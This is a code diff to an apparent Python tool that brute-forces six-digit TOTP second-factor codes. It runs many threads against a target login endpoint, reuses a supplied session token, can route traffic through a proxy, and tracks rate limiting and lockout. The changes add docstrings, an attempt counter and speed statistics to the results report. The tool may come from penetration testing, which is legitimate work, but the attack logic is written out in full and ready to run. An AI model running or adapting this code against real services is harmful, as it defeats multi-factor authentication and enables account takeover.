@@ -3,6 +3,7 @@ import time
 import sys
 import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock
 
 import urllib3
 from datetime import datetime, timezone
@@ -22,6 +23,15 @@ except ImportError:
 
 
 def make_session(proxy = None):
+    """
+    Initializes requests. Session object with automated retry
+    Retries for common server errors like 500, 502 and 503 and routes traffic through the chosen HTTP/HTTPS proxy.
+    Args:
+        proxy (str): proxy url
+    Returns:
+        requests.Session: session object
+
+    """
     session = requests.Session()
     retries = Retry(total=3, backoff_factor=0.2, status_forcelist=[500, 502, 503])
     adapter = HTTPAdapter(max_retries=retries)
@@ -32,6 +42,15 @@ def make_session(proxy = None):
     return session
 
 def set_auth(session, token, cookie, header_name):
+    """
+    Applies auth credentials to a session object.
+    Attaches a token to a specified cookie or HTTP Auth header.
+    Args:
+        session (requests.Session): session object
+        cookie (str): cookie name
+        header_name (str): header name
+        token(str): auth token/secret
+    """
     if token:
         if cookie:
             session.cookies.set(cookie, token)
@@ -42,13 +61,34 @@ def set_auth(session, token, cookie, header_name):
 
 
 def enumerate_codes(session, url, field_code, success, verbose, start=0, end=999999):
-    found = [None]  # shared result
+    """
+    Multi-thread search accorss codes starting from 000000 to 999999
+    Uses a thread pool to concurrently test the values. If there is a successful response, the search stops.
+    Args:
+        session (requests.Session): session object
+        url (str): target url
+        field_code (str): key name expected by server for the code
+        success (bool): success flag
+        verbose (bool): if true, logs every individual attempt to console
+        start (int): start index, defaults to 0
+        end (int): end index, defaults to 999999
+    Returns:
+        tuple containing:
+            str or None: succesful code if found, otherwise nothing
+            stats: execution metrics
+    """
+    attemot_counter = [0]
+    lock = Lock()
+    start_time = time.time()
+    found = [None]
 
     def try_single(code_int):
         if found[0]:
             return None
         code = f"{code_int:06d}"
         result = _try_code(session, url, code, field_code, success, verbose)
+        with lock:
+            attemot_counter[0] += 1
         if result == "success":
             found[0] = code
             print(f"\n[!!!] TOTP accepted: {code}")
@@ -62,11 +102,34 @@ def enumerate_codes(session, url, field_code, success, verbose, start=0, end=999
             if found[0]:
                 executor.shutdown(wait=False, cancel_futures=True)
                 break
+        elapsed = time.time() - start_time
+        stats ={
+            "attempts": attemot_counter[0],
+            "time_in_seconds": round(elapsed, 2),
+            "time": f"{int(elapsed//60)} minutes {int(elapsed%60)} seconds",
+            "codes_in_a_second": round(attemot_counter[0] / elapsed, 2) if elapsed > 0 else 0,
+            "percentage_searched": round((attemot_counter[0] / (end - start + 1)) * 100, 4)
+        }
+        print(f"\n[*] Attempts: {stats['attempts']} | Time: {stats['time_in_seconds']} | Speed: {stats['codes_in_a_second']} req/s")
 
-    return found[0]
+
+    return found[0], stats
 
 
 def _try_code(session, url, code, field_code, success, verbose):
+    """
+    HTTP POST request to test specific code
+    Evaluate server HTTP status code and response body
+    Args:
+        session (requests.Session): session object
+        url (str): target url
+        code (str): zero padded 6 digit code being tested
+        field_code (str): key name expected for submission payload
+        success (bool): success flag
+        verbose (bool): if true, prints status indicators to stdout
+    Returns:
+        str: status outcome identifier string(success, ratelimited, locked, failed)
+    """
     payload = {field_code: code}
 
     try:
@@ -89,6 +152,12 @@ def _try_code(session, url, code, field_code, success, verbose):
     return "fail"
 
 def save_report(data, path="totp_results.json"):
+    """
+    Saves report as JSON
+    Args:
+        data (dict): report data containing fidings and statistics
+        path (str): path to save report to
+    """
     data["generated"] = datetime.now(timezone.utc).isoformat()
     with open(path, "w") as f:
         json.dump(data, f, indent=2)
@@ -117,8 +186,9 @@ def main():
     result_data = {"mode": args.mode, "url": args.url, "findings": []}
 
     if args.mode == "enumerate":
-        code = enumerate_codes(s, args.url, args.field_code, args.success,
+        code, stats = enumerate_codes(s, args.url, args.field_code, args.success,
                                 args.verbose, args.start, args.end)
+        result_data["stats"] = stats
         if code:
             result_data["findings"].append({"type": "enumeration_success", "code": code})
 
